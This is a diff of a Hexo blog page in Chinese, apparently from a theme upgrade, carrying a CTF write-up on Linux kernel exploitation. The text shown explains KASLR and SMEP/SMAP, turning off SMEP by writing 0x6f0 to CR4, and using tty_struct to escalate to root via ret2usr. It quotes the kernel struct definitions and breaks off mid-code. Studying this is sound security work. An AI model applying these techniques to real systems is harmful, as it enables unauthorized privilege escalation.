@@ -1,134 +1,56 @@
 <!DOCTYPE html>
-
-
-
-
-
-
-
-
-
-
-
-
-  
-
-
-<html class="theme-next muse use-motion" lang="zh-CN">
+<html lang="zh-CN">
 <head>
-  <meta charset="UTF-8"/>
-<meta http-equiv="X-UA-Compatible" content="IE=edge"/>
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2"/>
-<meta name="theme-color" content="#222"/>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
 
-
-  
-  
-  <link rel="stylesheet" href="/lib/needsharebutton/needsharebutton.css"/>
-
-
-
-
+<link rel="stylesheet" href="/css/main.css">
 
 
 
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.14.0/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css">
 
-
-  <meta name="google-site-verification" content="JaodW7D6jSkocuG_zIdKbBnDjM2skzLPZwv5CJMuXiM"/>
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2"/>
-
-<link rel="stylesheet" href="/css/main.css?v=7.0.1"/>
-
-
-  <link rel="apple-touch-icon" sizes="180x180" href="/avatar/avatar.jpeg?v=7.0.1">
-
-
-  <link rel="icon" type="image/png" sizes="32x32" href="/avatar/avatar.jpeg?v=7.0.1">
-
-
-  <link rel="icon" type="image/png" sizes="16x16" href="/avatar/avatar.jpeg?v=7.0.1">
-
-
-  <link rel="mask-icon" href="/avatar/avatar.jpeg?v=7.0.1" color="#222">
-
-
-
-
-
-
-
-<script id="hexo.configurations">
-  var NexT = window.NexT || {};
-  var CONFIG = {
-    root: '/',
-    scheme: 'Muse',
-    version: '7.0.1',
-    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false,"dimmer":false},
-    back2top: true,
-    back2top_sidebar: false,
-    fancybox: false,
-    fastclick: false,
-    lazyload: false,
-    tabs: true,
-    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
-    algolia: {
-      applicationID: '',
-      apiKey: '',
-      indexName: '',
-      hits: {"per_page":10},
-      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
-    }
-  };
-</script>
-
-
-  
-
-
-
+<script class="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"sunichi.github.io","root":"/","scheme":"Muse","version":"8.0.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}};
+  </script>
 
   <meta name="description" content="趁热把kernel pwn的一些东西整理一下。">
-<meta name="keywords" content="linux,kernel,pwn,smep,smap,ret2usr">
 <meta property="og:type" content="article">
 <meta property="og:title" content="由一个Kernel Pwn引发的血案">
 <meta property="og:url" content="https://sunichi.github.io/2019/04/29/how-to-ret2usr/index.html">
 <meta property="og:site_name" content="Sunichi&#39;s Blog">
 <meta property="og:description" content="趁热把kernel pwn的一些东西整理一下。">
-<meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2019-05-08T13:40:00.000Z">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2019-04-29T11:30:00.000Z">
+<meta property="article:modified_time" content="2019-05-08T13:40:00.000Z">
+<meta property="article:author" content="sunichi">
+<meta property="article:tag" content="kernel">
+<meta property="article:tag" content="linux">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="smep">
+<meta property="article:tag" content="smap">
+<meta property="article:tag" content="ret2usr">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="由一个Kernel Pwn引发的血案">
-<meta name="twitter:description" content="趁热把kernel pwn的一些东西整理一下。">
 
 
+<link rel="canonical" href="https://sunichi.github.io/2019/04/29/how-to-ret2usr/">
 
 
-
-
-  <link rel="canonical" href="https://sunichi.github.io/2019/04/29/how-to-ret2usr/"/>
-
-
-
-<script id="page.configurations">
+<script class="page-configurations">
+  // https://hexo.io/docs/variables.html
   CONFIG.page = {
     sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
   };
 </script>
 
@@ -140,311 +62,204 @@
 
 
 
-
-
-
-
-
-
   <noscript>
   <style>
-  .use-motion .motion-element,
-  .use-motion .brand,
+  body { margin-top: 2rem; }
+
   .use-motion .menu-item,
-  .sidebar-inner,
+  .use-motion .sidebar,
   .use-motion .post-block,
   .use-motion .pagination,
   .use-motion .comments,
   .use-motion .post-header,
   .use-motion .post-body,
-  .use-motion .collection-title { opacity: initial; }
+  .use-motion .collection-header {
+    visibility: visible;
+  }
 
-  .use-motion .logo,
+  .use-motion .header,
+  .use-motion .site-brand-container .toggle,
+  .use-motion .footer { opacity: initial; }
+
   .use-motion .site-title,
-  .use-motion .site-subtitle {
+  .use-motion .site-subtitle,
+  .use-motion .custom-logo-image {
     opacity: initial;
     top: initial;
   }
 
-  .use-motion .logo-line-before i { left: initial; }
-  .use-motion .logo-line-after i { right: initial; }
+  .use-motion .logo-line {
+    transform: scaleX(1);
+  }
+
+  .search-pop-overlay, .sidebar-nav { display: none; }
+  .sidebar-panel { display: block; }
   </style>
 </noscript>
 
 </head>
 
-<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
 
-  
-  
-    
-  
-
-  <div class="container sidebar-position-left page-post-detail">
-    <div class="headband"></div>
-
-    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
-      <div class="header-inner"><div class="site-brand-wrapper">
-  <div class="site-meta">
-    
-
-    <div class="custom-logo-site-title">
-      <a href="/" class="brand" rel="start">
-        <span class="logo-line-before"><i></i></span>
-        <span class="site-title">Sunichi's Blog</span>
-        <span class="logo-line-after"><i></i></span>
-      </a>
-    </div>
-    
-      
-        <h1 class="site-subtitle" itemprop="description">sunichi@DUBHE | Linux & Pwn & Fuzz</h1>
-      
-    
-    
-  </div>
-
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
   <div class="site-nav-toggle">
-    <button aria-label="切换导航栏">
-      <span class="btn-bar"></span>
-      <span class="btn-bar"></span>
-      <span class="btn-bar"></span>
-    </button>
+    <div class="toggle" aria-label="切换导航栏">
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <h1 class="site-title">Sunichi's Blog</h1>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">sunichi@DUBHE | Linux & Pwn & Fuzz</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
   </div>
 </div>
 
 
 
-<nav class="site-nav">
+
+
+
+
+</div>
+        
   
-    <ul id="menu" class="menu">
-      
-        
-        
-        
-          
-          <li class="menu-item menu-item-home">
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
 
-    
-    
-    
-      
-    
+  <aside class="sidebar">
 
-    
-
-    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br/>首页</a>
-
-  </li>
-        
-        
-        
-          
-          <li class="menu-item menu-item-tags">
-
-    
-    
-    
-      
-    
-
-    
-
-    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br/>标签</a>
-
-  </li>
-        
-        
-        
-          
-          <li class="menu-item menu-item-archives">
-
-    
-    
-    
-      
-    
-
-    
-
-    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br/>归档</a>
-
-  </li>
-
-      
-      
-        <li class="menu-item menu-item-search">
-          
-            <a href="javascript:;" class="popup-trigger">
-          
-            
-              <i class="menu-item-icon fa fa-search fa-fw"></i> <br/>搜索</a>
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
         </li>
-      
-    </ul>
-  
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
 
-  
-    
+      <!--noindex-->
+      <section class="post-toc-wrap sidebar-panel">
+          <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="nav-number">1.</span> <span class="nav-text">前置知识</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#KASLR"><span class="nav-number">1.1.</span> <span class="nav-text">KASLR</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E6%AE%B5%E5%92%8C%E6%A8%A1%E5%9D%97%E5%9F%BA%E5%9C%B0%E5%9D%80"><span class="nav-number">1.1.1.</span> <span class="nav-text">代码段和模块基地址</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%A0%88%E5%9F%BA"><span class="nav-number">1.1.2.</span> <span class="nav-text">栈基</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%8A%A8%E6%80%81%E5%86%85%E5%AD%98%E5%9F%BA"><span class="nav-number">1.1.3.</span> <span class="nav-text">动态内存基</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SMEP-amp-SMAP"><span class="nav-number">1.2.</span> <span class="nav-text">SMEP&amp;SMAP</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CISCN-2017-babydriver"><span class="nav-number">2.</span> <span class="nav-text">CISCN 2017 babydriver</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#UAF"><span class="nav-number">2.1.</span> <span class="nav-text">UAF</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Bypass-SMEP-amp-ret2usr"><span class="nav-number">2.2.</span> <span class="nav-text">Bypass SMEP &amp; ret2usr</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0CTF-2017-knote"><span class="nav-number">3.</span> <span class="nav-text">0CTF 2017 knote</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Midnight-Sun-CTF-Quals-hfsipc"><span class="nav-number">4.</span> <span class="nav-text">Midnight Sun CTF Quals hfsipc</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Hijack-cred"><span class="nav-number">4.1.</span> <span class="nav-text">Hijack cred</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Hijack-modprobe"><span class="nav-number">4.2.</span> <span class="nav-text">Hijack modprobe</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CTF-2019-hackme"><span class="nav-number">5.</span> <span class="nav-text">*CTF 2019 hackme</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#SMEP%E5%BC%80%E5%90%AF%E7%9A%84%E6%83%85%E5%86%B5%E4%B8%8B"><span class="nav-number">5.1.</span> <span class="nav-text">SMEP开启的情况下</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SMEP-amp-SMAP%E5%BC%80%E5%90%AF%E7%9A%84%E6%83%85%E5%86%B5%E4%B8%8B"><span class="nav-number">5.2.</span> <span class="nav-text">SMEP&amp;SMAP开启的情况下</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#musl-gcc"><span class="nav-number">6.</span> <span class="nav-text">musl-gcc</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Using-SSH-in-pwntools"><span class="nav-number">7.</span> <span class="nav-text">Using SSH in pwntools</span></a></li></ol></div>
+      </section>
+      <!--/noindex-->
 
-  
-
-  
-    <div class="site-search">
-      
-  <div class="popup search-popup local-search-popup">
-  <div class="local-search-header clearfix">
-    <span class="search-icon">
-      <i class="fa fa-search"></i>
-    </span>
-    <span class="popup-btn-close">
-      <i class="fa fa-times-circle"></i>
-    </span>
-    <div class="local-search-input-wrapper">
-      <input autocomplete="off"
-             placeholder="搜索..." spellcheck="false"
-             type="text" id="local-search-input">
-    </div>
-  </div>
-  <div id="local-search-result"></div>
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">sunichi</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives">
+          <span class="site-state-item-count">46</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+        <span class="site-state-item-count">54</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
 </div>
 
 
 
+      </section>
     </div>
-  
-</nav>
+  </aside>
+  <div class="sidebar-dimmer"></div>
 
 
-
-  
-
-
-
-</div>
     </header>
 
     
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
 
 
-    <main id="main" class="main">
-      <div class="main-inner">
-        <div class="content-wrap">
-          
-          <div id="content" class="content">
-            
+    <div class="main-inner post posts-expand">
+      
 
-  <div id="posts" class="posts-expand">
+      
+
     
-
-  
-
   
   
-  
-
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://sunichi.github.io/2019/04/29/how-to-ret2usr/"/>
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://sunichi.github.io/2019/04/29/how-to-ret2usr/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="sunichi"/>
-      <meta itemprop="description" content=""/>
-      <meta itemprop="image" content="/avatar/avatar.jpeg"/>
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="sunichi">
+      <meta itemprop="description" content="">
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Sunichi's Blog"/>
+      <meta itemprop="name" content="Sunichi's Blog">
     </span>
 
     
+    
       <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          由一个Kernel Pwn引发的血案
+        </h1>
 
-        
-        
-          <h2 class="post-title" itemprop="name headline">由一个Kernel Pwn引发的血案
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
 
-              
-            
-          </h2>
-        
+      <time title="创建时间：2019-04-29 19:30:00" itemprop="dateCreated datePublished" datetime="2019-04-29T19:30:00+08:00">2019-04-29</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">更新于</span>
+        <time title="修改时间：2019-05-08 21:40:00" itemprop="dateModified" datetime="2019-05-08T21:40:00+08:00">2019-05-08</time>
+      </span>
 
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-
-              
-                
-              
-
-              <time title="创建时间：2019-04-29 19:30:00" itemprop="dateCreated datePublished" datetime="2019-04-29T19:30:00+08:00">2019-04-29</time>
-            
-
-            
-              
-
-              
-                
-                <span class="post-meta-divider">|</span>
-                
-
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">更新于</span>
-                
-                <time title="修改时间：2019-05-08 21:40:00" itemprop="dateModified" datetime="2019-05-08T21:40:00+08:00">2019-05-08</time>
-              
-            
-          </span>
-
-          
-
-          
-            
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
+  
+</div>
 
         </div>
       </header>
-    
 
     
     
     
     <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
         <p>趁热把kernel pwn的一些东西整理一下。</p>
 <a id="more"></a>
+
 <h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><h4 id="KASLR"><a href="#KASLR" class="headerlink" title="KASLR"></a>KASLR</h4><p>内核地址空间布局随机化，并不默认开启，需要在内核命令行中添加指定指令。</p>
 <h5 id="代码段和模块基地址"><a href="#代码段和模块基地址" class="headerlink" title="代码段和模块基地址"></a>代码段和模块基地址</h5><p>通过在启动时( CONFIG_RANDOMIZE_BASE)对内核的物理和虚拟地址的基地址进行重定位。另外，随机加载基地址意味着系统每次启动以相同的顺序加载相同的模块不会共享同样的基地址。</p>
 <h5 id="栈基"><a href="#栈基" class="headerlink" title="栈基"></a>栈基</h5><p>如果内核栈的基地址对于不同的进程甚至系统调用都不一样，攻击将变得很困难。</p>
@@ -454,904 +269,166 @@
 <h4 id="Bypass-SMEP-amp-ret2usr"><a href="#Bypass-SMEP-amp-ret2usr" class="headerlink" title="Bypass SMEP &amp; ret2usr"></a>Bypass SMEP &amp; ret2usr</h4><p>当内核开启了SMEP后，无法在内核空间直接执行用户空间代码，因此需要绕过SMEP保护来提权。系统根据CR4寄存器的第20位判断是否开启SMEP保护，CR4寄存器的值可通过诸如<code>mov cr4, xxx</code>来修改。为了关闭SMEP，通常向CR4寄存器写入0x6f0。</p>
 <p>通过<code>open(&quot;/dev/ptmx&quot;, O_RDWR)</code>来让内核分配一个<code>tty_struct</code>结构体：</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> magic;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kref</span> <span class="title">kref</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">device</span> *<span class="title">dev</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_driver</span> *<span class="title">driver</span>;</span></span><br><span class="line">    <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line">    <span class="keyword">int</span> index;</span><br><span class="line">    <span class="comment">/* Protects ldisc changes: Lock tty not pty */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ld_semaphore</span> <span class="title">ldisc_sem</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_ldisc</span> *<span class="title">ldisc</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">atomic_write_lock</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">legacy_mutex</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">throttle_mutex</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rw_semaphore</span> <span class="title">termios_rwsem</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">winsize_mutex</span>;</span></span><br><span class="line">    <span class="keyword">spinlock_t</span> ctrl_lock;</span><br><span class="line">    <span class="keyword">spinlock_t</span> flow_lock;</span><br><span class="line">    <span class="comment">/* Termios values are protected by the termios rwsem */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ktermios</span> <span class="title">termios</span>, <span class="title">termios_locked</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">termiox</span> *<span class="title">termiox</span>;</span>    <span class="comment">/* May be NULL for unsupported */</span></span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">64</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">pgrp</span>;</span>       <span class="comment">/* Protected by ctrl lock */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">session</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> flags;</span><br><span class="line">    <span class="keyword">int</span> count;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">winsize</span> <span class="title">winsize</span>;</span>     <span class="comment">/* winsize_mutex */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> stopped:<span class="number">1</span>,    <span class="comment">/* flow_lock */</span></span><br><span class="line">              flow_stopped:<span class="number">1</span>,</span><br><span class="line">              unused:BITS_PER_LONG - <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">int</span> hw_stopped;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> ctrl_status:<span class="number">8</span>,    <span class="comment">/* ctrl_lock */</span></span><br><span class="line">              packet:<span class="number">1</span>,</span><br><span class="line">              unused_ctrl:BITS_PER_LONG - <span class="number">9</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> receive_room;  <span class="comment">/* Bytes free for queue */</span></span><br><span class="line">    <span class="keyword">int</span> flow_change;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> *<span class="title">link</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">fasync_struct</span> *<span class="title">fasync</span>;</span></span><br><span class="line">    <span class="keyword">wait_queue_head_t</span> write_wait;</span><br><span class="line">    <span class="keyword">wait_queue_head_t</span> read_wait;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">hangup_work</span>;</span></span><br><span class="line">    <span class="keyword">void</span> *disc_data;</span><br><span class="line">    <span class="keyword">void</span> *driver_data;</span><br><span class="line">    <span class="keyword">spinlock_t</span> files_lock;      <span class="comment">/* protects tty_files list */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">tty_files</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N_TTY_BUF_SIZE 4096</span></span><br><span class="line">    <span class="keyword">int</span> closing;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> *write_buf;</span><br><span class="line">    <span class="keyword">int</span> write_cnt;</span><br><span class="line">    <span class="comment">/* If the tty has a pending do_SAK, queue it here - akpm */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">SAK_work</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_port</span> *<span class="title">port</span>;</span></span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure>
+
 <p>主要关注第五个成员<code>const struct tty_operations *ops</code>：</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> * (*<span class="title">lookup</span>)(<span class="title">struct</span> <span class="title">tty_driver</span> *<span class="title">driver</span>,</span></span><br><span class="line"><span class="class">            <span class="title">struct</span> <span class="title">file</span> *<span class="title">filp</span>, <span class="title">int</span> <span class="title">idx</span>);</span></span><br><span class="line">    <span class="keyword">int</span>  (*install)(struct tty_driver *driver, struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*remove)(struct tty_driver *driver, struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span>  (*open)(struct tty_struct * tty, struct file * filp);</span><br><span class="line">    <span class="keyword">void</span> (*close)(struct tty_struct * tty, struct file * filp);</span><br><span class="line">    <span class="keyword">void</span> (*shutdown)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*cleanup)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span>  (*write)(struct tty_struct * tty,</span><br><span class="line">              <span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> *buf, <span class="keyword">int</span> count);</span><br><span class="line">    <span class="keyword">int</span>  (*put_char)(struct tty_struct *tty, <span class="keyword">unsigned</span> <span class="keyword">char</span> ch);</span><br><span class="line">    <span class="keyword">void</span> (*flush_chars)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span>  (*write_room)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span>  (*chars_in_buffer)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span>  (*ioctl)(struct tty_struct *tty,</span><br><span class="line">            <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg);</span><br><span class="line">    <span class="keyword">long</span> (*compat_ioctl)(struct tty_struct *tty,</span><br><span class="line">                 <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg);</span><br><span class="line">    <span class="keyword">void</span> (*set_termios)(struct tty_struct *tty, struct ktermios * old);</span><br><span class="line">    <span class="keyword">void</span> (*throttle)(struct tty_struct * tty);</span><br><span class="line">    <span class="keyword">void</span> (*unthrottle)(struct tty_struct * tty);</span><br><span class="line">    <span class="keyword">void</span> (*stop)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*start)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*hangup)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span> (*break_ctl)(struct tty_struct *tty, <span class="keyword">int</span> state);</span><br><span class="line">    <span class="keyword">void</span> (*flush_buffer)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*set_ldisc)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*wait_until_sent)(struct tty_struct *tty, <span class="keyword">int</span> timeout);</span><br><span class="line">    <span class="keyword">void</span> (*send_xchar)(struct tty_struct *tty, <span class="keyword">char</span> ch);</span><br><span class="line">    <span class="keyword">int</span> (*tiocmget)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span> (*tiocmset)(struct tty_struct *tty,</span><br><span class="line">            <span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="built_in">set</span>, <span class="keyword">unsigned</span> <span class="keyword">int</span> clear);</span><br><span 